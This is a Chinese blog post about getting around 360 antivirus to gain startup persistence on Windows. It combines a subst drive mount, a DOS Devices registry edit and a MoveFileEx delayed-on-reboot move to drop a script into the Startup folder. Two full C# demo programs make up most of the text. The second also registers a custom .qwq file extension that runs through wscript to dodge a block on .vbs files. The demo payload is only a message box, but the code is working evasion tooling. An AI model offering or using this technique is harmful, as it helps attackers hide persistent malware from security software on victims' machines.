---
title: 一个不太好用的过360启动方案
date: 2023-2-27 17:49:45
categories: 
- Persistence
tags:
- Bypass
- 360
- Persistence
---
突发奇想的一个思路，不太好用就发出来玩玩吧

# 背景知识

## 目录挂载

subst是Windows自带的一个工具，可以将文件目录挂载为磁盘，但是重启后不会继续挂载了。

如果想长期挂载，需要修改注册表 ``HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices``。

[https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/subst](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/subst)

## MoveFileEx

MoveFileEx函数第三个参数，可以设置为MOVEFILE_DELAY_UNTIL_REBOOT，实现重启后移动文件。

此参数仅适用于同一盘符内文件的移动。

[https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-movefileexa](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-movefileexa)

# 绕过思路

shell:startup目录是用户的启动文件夹，其中的文件会在系统启动时执行，杀软也肯定对写入该目录存在监控

但是杀软无法拦截MoveFileEx导致的重启后移动，所以挂载启动文件夹为新盘符目录后通过MoveFileEx即可移动文件至启动文件夹中

# Demo代码

```
using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Demo
{
    internal class Program
    {
        [Flags]
        enum MoveFileFlags
        {
            MOVEFILE_REPLACE_EXISTING = 0x00000001,
            MOVEFILE_COPY_ALLOWED = 0x00000002,
            MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004,
            MOVEFILE_WRITE_THROUGH = 0x00000008,
            MOVEFILE_CREATE_HARDLINK = 0x00000010,
            MOVEFILE_FAIL_IF_NOT_TRACKABLE = 0x00000020
        }

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, MoveFileFlags dwFlags);
        static void Main(string[] args)
        {
            File.WriteAllText("C:\\Windows\\Temp\\1.vbs", "msgbox(\"test\")");
            string newdisk = "X:";
            string filepath = "C:\\Windows\\Temp\\1.vbs";
            string filename = "1.vbs";

            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string programs = appdata + "\\Microsoft\\Windows\\Start Menu\\Programs";
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices", true);
            registryKey.SetValue(newdisk, "\\??\\"+ programs);
            Process.Start("subst", newdisk+" \""+ programs + "\"");
            File.Copy(filepath, programs+"\\"+ filename);
            MoveFileEx(newdisk+ "\\" + filename, newdisk + "\\Startup\\" + filename, MoveFileFlags.MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    }
}

```

# 2023/4/16更新

有朋友测试发现vbs后缀被拦了，懒得搞其他冷门后缀了，直接自己搞个后缀吧

```csharp
using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Demo
{
    internal class Program
    {
        [Flags]
        enum MoveFileFlags
        {
            MOVEFILE_REPLACE_EXISTING = 0x00000001,
            MOVEFILE_COPY_ALLOWED = 0x00000002,
            MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004,
            MOVEFILE_WRITE_THROUGH = 0x00000008,
            MOVEFILE_CREATE_HARDLINK = 0x00000010,
            MOVEFILE_FAIL_IF_NOT_TRACKABLE = 0x00000020
        }
      
        public static void RegisterFileType()
        {
            RegistryKey softwareKey = Registry.ClassesRoot.OpenSubKey(".qwq");
            if (softwareKey != null)
            {
                return;
            }

            RegistryKey fileTypeKey = Registry.ClassesRoot.CreateSubKey(".qwq");
            string relationName = "QWQDANCHUN";
            fileTypeKey.SetValue("", relationName);
            fileTypeKey.Close();

            RegistryKey relationKey = Registry.ClassesRoot.CreateSubKey(relationName);
            relationKey.SetValue("", "Bypass Startup Script");

            RegistryKey shellKey = relationKey.CreateSubKey("Shell");

            RegistryKey openKey = shellKey.CreateSubKey("Open");

            RegistryKey commandKey = openKey.CreateSubKey("Command");
            commandKey.SetValue("", "wscript.exe //E:vbscript" + " %1");
            relationKey.Close();
        }

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, MoveFileFlags dwFlags);
        static void Main(string[] args)
        {
            File.WriteAllText("C:\\Windows\\Temp\\test.qwq", "msgbox(\"test\")");
            string newdisk = "X:";
            string filepath = "C:\\Windows\\Temp\\test.qwq";
            string filename = "test.qwq";

            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string programs = appdata + "\\Microsoft\\Windows\\Start Menu\\Programs";
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices", true);
            registryKey.SetValue(newdisk, "\\??\\" + programs);
            Process.Start("subst", newdisk + " \"" + programs + "\"");
            File.Copy(filepath, programs + "\\" + filename);
            MoveFileEx(newdisk + "\\" + filename, newdisk + "\\Startup\\" + filename, MoveFileFlags.MOVEFILE_DELAY_UNTIL_REBOOT);
            RegisterFileType();
        }
    }
}

```
